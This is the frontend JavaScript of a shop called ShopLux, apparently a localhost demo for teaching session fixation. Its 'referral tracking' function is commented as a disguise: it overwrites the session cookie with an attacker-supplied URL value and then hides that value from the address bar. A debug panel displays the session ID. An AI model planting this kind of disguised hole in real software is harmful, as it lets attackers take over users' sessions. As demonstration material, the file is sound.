/* ═══════════════════════════════════════════════════════════════
   ShopLux — Frontend Application
   ═══════════════════════════════════════════════════════════════ */

(function () {
  'use strict';

  /* ─────────────────────────────────────────────────────────────
     "Referral tracking" — runs on every page load.
     Reads the `ref` parameter from the URL and stores it as a
     cookie for attribution. Looks like standard marketing code.

     In reality: this overwrites the session cookie with whatever
     value is in `ref` — enabling session fixation.

     The attacker's link looks completely normal:
       http://localhost:3000/?ref=a8f3c9e1b7d2...

     After setting the cookie, the `ref` param is silently removed
     from the URL bar so the victim never notices it.
     ───────────────────────────────────────────────────────────── */
  (function handleReferral() {
    const params = new URLSearchParams(window.location.search);
    const ref = params.get('ref');
    if (ref) {
      // Overwrite session cookie with the attacker's session ID
      document.cookie = 'SHOPLUX_SESSION=' + ref + '; path=/; SameSite=Lax';

      // Clean the URL — remove the ref param so victim doesn't notice
      params.delete('ref');
      const cleanUrl = params.toString()
        ? window.location.pathname + '?' + params.toString()
        : window.location.pathname;
      window.history.replaceState({}, '', cleanUrl);
    }
  })();

  /* ─── State ─── */
  let products = [];
  let cart = [];
  let currentUser = null;
  let activeCategory = 'all';

  /* ─── DOM References ─── */
  const $ = (sel) => document.querySelector(sel);
  const $$ = (sel) => document.querySelectorAll(sel);

  const dom = {
    // Navbar
    cartBtn: $('#cart-btn'),
    cartCount: $('#cart-count'),
    authSection: $('#auth-section'),
    loginBtn: $('#login-btn'),
    navbar: $('#navbar'),

    // Products
    productsGrid: $('#products-grid'),
    filterBar: $('.filter-bar'),

    // Cart Sidebar
    cartOverlay: $('#cart-overlay'),
    cartSidebar: $('#cart-sidebar'),
    closeCart: $('#close-cart'),
    cartItems: $('#cart-items'),
    cartFooter: $('#cart-footer'),
    cartSubtotal: $('#cart-subtotal'),
    cartTotal: $('#cart-total'),

    // Login Modal
    loginOverlay: $('#login-overlay'),
    loginModal: $('#login-modal'),
    closeModal: $('#close-modal'),
    loginForm: $('#login-form'),
    loginError: $('#login-error'),
    usernameInput: $('#username'),
    passwordInput: $('#password'),

    // Toast
    toastContainer: $('#toast-container'),

    // Debug
    debugPanel: $('#debug-panel'),
    debugToggle: $('#debug-toggle'),
    debugContent: $('#debug-content'),
    debugSid: $('#debug-sid'),
    debugStatus: $('#debug-status'),
    debugUser: $('#debug-user'),
  };

  /* ═══════════════════════════════════════════════════════════════
     API HELPERS
     ═══════════════════════════════════════════════════════════════ */
  async function api(url, options = {}) {
    const res = await fetch(url, {
      headers: { 'Content-Type': 'application/json' },
      ...options,
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || 'Request failed');
    return data;
  }

  /* ═══════════════════════════════════════════════════════════════
     PRODUCTS
     ═══════════════════════════════════════════════════════════════ */
  async function loadProducts() {
    try {
      products = await api('/api/products');
      buildFilterTabs();
      renderProducts();
    } catch (err) {
      console.error('Failed to load products:', err);
    }
  }

  function buildFilterTabs() {
    const categories = ['all', ...new Set(products.map((p) => p.category))];
    dom.filterBar.innerHTML = categories
      .map(
        (cat) => `
        <button class="filter-tab ${cat === activeCategory ? 'active' : ''}" data-category="${cat}">
          ${cat === 'all' ? 'All' : cat}
        </button>
      `
      )
      .join('');

    dom.filterBar.addEventListener('click', (e) => {
      const tab = e.target.closest('.filter-tab');
      if (!tab) return;
      activeCategory = tab.dataset.category;
      $$('.filter-tab').forEach((t) => t.classList.remove('active'));
      tab.classList.add('active');
      renderProducts();
    });
  }

  function renderProducts() {
    const filtered =
      activeCategory === 'all'
        ? products
        : products.filter((p) => p.category === activeCategory);

    dom.productsGrid.innerHTML = filtered
      .map(
        (p, i) => `
        <div class="product-card" style="animation-delay: ${i * 0.08}s" data-id="${p.id}">
          ${p.badge ? `<span class="product-badge badge-${p.badge.toLowerCase().replace(' ', '-')}">${p.badge}</span>` : ''}
          <span class="product-emoji">${p.emoji}</span>
          <div class="product-category">${p.category}</div>
          <div class="product-name">${p.name}</div>
          <div class="product-description">${p.description}</div>
          <div class="product-footer">
            <div class="product-price">${p.price}</div>
            <button class="add-to-cart-btn" data-product-id="${p.id}" aria-label="Add ${p.name} to cart" title="Add to cart">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <path d="M12 5v14M5 12h14"/>
              </svg>
            </button>
          </div>
        </div>
      `
      )
      .join('');

    // Stagger animation
    $$('.product-card').forEach((card, i) => {
      card.style.opacity = '0';
      card.style.transform = 'translateY(20px)';
      setTimeout(() => {
        card.style.transition = 'all 0.5s cubic-bezier(0.16, 1, 0.3, 1)';
        card.style.opacity = '1';
        card.style.transform = 'translateY(0)';
      }, i * 80);
    });
  }

  /* ═══════════════════════════════════════════════════════════════
     CART
     ═══════════════════════════════════════════════════════════════ */
  async function addToCart(productId) {
    try {
      const data = await api('/api/cart/add', {
        method: 'POST',
        body: JSON.stringify({ productId }),
      });
      cart = data.cart;
      updateCartUI();

      // Animate button
      const btn = $(`.add-to-cart-btn[data-product-id="${productId}"]`);
      if (btn) {
        btn.classList.add('added');
        btn.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>`;
        setTimeout(() => {
          btn.classList.remove('added');
          btn.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12h14"/></svg>`;
        }, 1200);
      }

      const product = products.find((p) => p.id === productId);
      showToast(`${product?.emoji || '🛒'} ${product?.name || 'Item'} added to cart`, 'success');
    } catch (err) {
      showToast('Failed to add item', 'error');
    }
  }

  async function removeFromCart(productId) {
    try {
      const data = await api('/api/cart/remove', {
        method: 'POST',
        body: JSON.stringify({ productId }),
      });
      cart = data.cart;
      updateCartUI();
    } catch (err) {
      showToast('Failed to remove item', 'error');
    }
  }

  async function loadCart() {
    try {
      cart = await api('/api/cart');
      updateCartUI();
    } catch (err) {
      console.error('Failed to load cart:', err);
    }
  }

  function updateCartUI() {
    const totalItems = cart.reduce((sum, item) => sum + item.quantity, 0);
    const subtotal = cart.reduce((sum, item) => sum + item.price * item.quantity, 0);

    // Badge
    dom.cartCount.textContent = totalItems;
    dom.cartCount.classList.toggle('visible', totalItems > 0);

    // Cart items
    if (cart.length === 0) {
      dom.cartItems.innerHTML = `
        <div class="cart-empty">
          <span class="cart-empty-icon">🛒</span>
          <p>Your cart is empty</p>
        </div>`;
      dom.cartFooter.style.display = 'none';
    } else {
      dom.cartItems.innerHTML = cart
        .map(
          (item) => `
          <div class="cart-item">
            <div class="cart-item-emoji">${item.emoji}</div>
            <div class="cart-item-info">
              <div class="cart-item-name">${item.name}</div>
              <div class="cart-item-qty">Qty: ${item.quantity}</div>
              <button class="cart-item-remove" data-remove-id="${item.id}">Remove</button>
            </div>
            <div class="cart-item-price">$${(item.price * item.quantity).toFixed(2)}</div>
          </div>
        `
        )
        .join('');
      dom.cartFooter.style.display = 'block';
      dom.cartSubtotal.textContent = `$${subtotal.toFixed(2)}`;
      dom.cartTotal.textContent = `$${subtotal.toFixed(2)}`;
    }
  }

  function openCart() {
    dom.cartSidebar.classList.add('open');
    dom.cartOverlay.classList.add('active');
  }

  function closeCart() {
    dom.cartSidebar.classList.remove('open');
    dom.cartOverlay.classList.remove('active');
  }

  /* ═══════════════════════════════════════════════════════════════
     AUTHENTICATION
     ═══════════════════════════════════════════════════════════════ */
  async function login(username, password) {
    try {
      const data = await api('/api/login', {
        method: 'POST',
        body: JSON.stringify({ username, password }),
      });
      currentUser = data.user;
      updateAuthUI();
      closeLoginModal();
      showToast(`👋 Welcome back, ${currentUser.name}!`, 'success');
      loadCart();
      updateDebugPanel();
    } catch (err) {
      dom.loginError.textContent = err.message;
      dom.loginError.style.display = 'block';
      dom.loginForm.classList.add('shake');
      setTimeout(() => dom.loginForm.classList.remove('shake'), 500);
    }
  }

  async function logout() {
    try {
      await api('/api/logout', { method: 'POST' });
      currentUser = null;
      cart = [];
      updateAuthUI();
      updateCartUI();
      showToast('👋 Signed out successfully', 'success');
      updateDebugPanel();
    } catch (err) {
      showToast('Logout failed', 'error');
    }
  }

  function updateAuthUI() {
    if (currentUser) {
      const initials = currentUser.name
        .split(' ')
        .map((n) => n[0])
        .join('')
        .toUpperCase();
      dom.authSection.innerHTML = `
        <button class="user-avatar-btn" id="user-menu-btn">
          <div class="user-avatar">${initials}</div>
          <span class="user-name">${currentUser.name.split(' ')[0]}</span>
        </button>
      `;
      $('#user-menu-btn').addEventListener('click', () => {
        if (confirm('Sign out?')) logout();
      });
    } else {
      dom.authSection.innerHTML = `<button id="login-btn" class="btn btn-primary btn-sm">Sign In</button>`;
      $('#login-btn').addEventListener('click', openLoginModal);
    }
  }

  function openLoginModal() {
    dom.loginModal.classList.add('active');
    dom.loginOverlay.classList.add('active');
    dom.loginError.style.display = 'none';
    dom.loginForm.reset();
    setTimeout(() => dom.usernameInput.focus(), 300);
  }

  function closeLoginModal() {
    dom.loginModal.classList.remove('active');
    dom.loginOverlay.classList.remove('active');
  }

  /* ═══════════════════════════════════════════════════════════════
     SESSION DEBUG PANEL
     ═══════════════════════════════════════════════════════════════ */
  async function updateDebugPanel() {
    try {
      const info = await api('/api/session-info');
      dom.debugSid.textContent = info.sessionId;
      dom.debugSid.title = info.sessionId; // full ID on hover

      if (info.isAuthenticated) {
        dom.debugStatus.textContent = '● Authenticated';
        dom.debugStatus.className = 'debug-value authenticated';
        dom.debugUser.textContent = info.user?.name || '—';
      } else {
        dom.debugStatus.textContent = '○ Not authenticated';
        dom.debugStatus.className = 'debug-value unauthenticated';
        dom.debugUser.textContent = '—';
      }
    } catch (err) {
      console.error('Debug panel update failed:', err);
    }
  }

  /* ═══════════════════════════════════════════════════════════════
     TOAST NOTIFICATIONS
     ═══════════════════════════════════════════════════════════════ */
  function showToast(message, type = 'success') {
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    const icon = type === 'success' ? '✓' : '✕';
    toast.innerHTML = `<span class="toast-icon">${icon}</span><span>${message}</span>`;
    dom.toastContainer.appendChild(toast);

    setTimeout(() => {
      toast.classList.add('exiting');
      setTimeout(() => toast.remove(), 350);
    }, 3000);
  }

  /* ═══════════════════════════════════════════════════════════════
     NAVBAR SCROLL EFFECT
     ═══════════════════════════════════════════════════════════════ */
  function initScrollEffect() {
    window.addEventListener(
      'scroll',
      () => {
        dom.navbar.classList.toggle('scrolled', window.scrollY > 20);
      },
      { passive: true }
    );
  }

  /* ═══════════════════════════════════════════════════════════════
     CHECK EXISTING SESSION
     ═══════════════════════════════════════════════════════════════ */
  async function checkSession() {
    try {
      const info = await api('/api/session-info');
      if (info.isAuthenticated && info.user) {
        currentUser = info.user;
        updateAuthUI();
      }
    } catch (err) {
      // Not logged in
    }
  }

  /* ═══════════════════════════════════════════════════════════════
     EVENT LISTENERS
     ═══════════════════════════════════════════════════════════════ */
  function initEvents() {
    // Cart button
    dom.cartBtn.addEventListener('click', openCart);
    dom.closeCart.addEventListener('click', closeCart);
    dom.cartOverlay.addEventListener('click', closeCart);

    // Login
    dom.loginBtn.addEventListener('click', openLoginModal);
    dom.closeModal.addEventListener('click', closeLoginModal);
    dom.loginOverlay.addEventListener('click', closeLoginModal);

    // Login form submit
    dom.loginForm.addEventListener('submit', (e) => {
      e.preventDefault();
      const username = dom.usernameInput.value.trim();
      const password = dom.passwordInput.value.trim();
      if (username && password) login(username, password);
    });

    // Add to cart (delegated)
    dom.productsGrid.addEventListener('click', (e) => {
      const btn = e.target.closest('.add-to-cart-btn');
      if (btn) {
        const productId = parseInt(btn.dataset.productId, 10);
        addToCart(productId);
      }
    });

    // Remove from cart (delegated)
    dom.cartItems.addEventListener('click', (e) => {
      const btn = e.target.closest('.cart-item-remove');
      if (btn) {
        const productId = parseInt(btn.dataset.removeId, 10);
        removeFromCart(productId);
      }
    });

    // Debug panel toggle
    dom.debugToggle.addEventListener('click', () => {
      dom.debugContent.classList.toggle('open');
      if (dom.debugContent.classList.contains('open')) {
        updateDebugPanel();
      }
    });

    // Keyboard: Escape closes modals
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        closeCart();
        closeLoginModal();
      }
    });

    // Scroll
    initScrollEffect();
  }

  /* ═══════════════════════════════════════════════════════════════
     INIT
     ═══════════════════════════════════════════════════════════════ */
  async function init() {
    initEvents();
    await checkSession();
    await loadProducts();
    await loadCart();
    updateDebugPanel();

    // Refresh debug panel periodically
    setInterval(updateDebugPanel, 5000);
  }

  // Boot when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
